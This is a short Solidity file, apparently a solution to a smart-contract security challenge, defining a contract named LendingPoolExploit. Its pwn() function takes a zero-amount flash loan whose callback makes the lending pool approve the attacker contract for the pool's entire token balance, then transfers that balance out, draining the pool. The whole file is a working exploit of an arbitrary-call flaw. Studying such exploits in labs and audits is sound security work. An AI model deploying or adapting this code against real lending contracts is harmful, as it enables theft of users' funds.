// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    // declare any ERC20 functions that you need to call here
    function transferFrom(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address owner) external returns(uint);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    function pwn() external {
        // this function will be called
        pool.flashLoan(0, address(token), abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this),
            token.balanceOf(address(pool))
        ));
        token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));
    }
}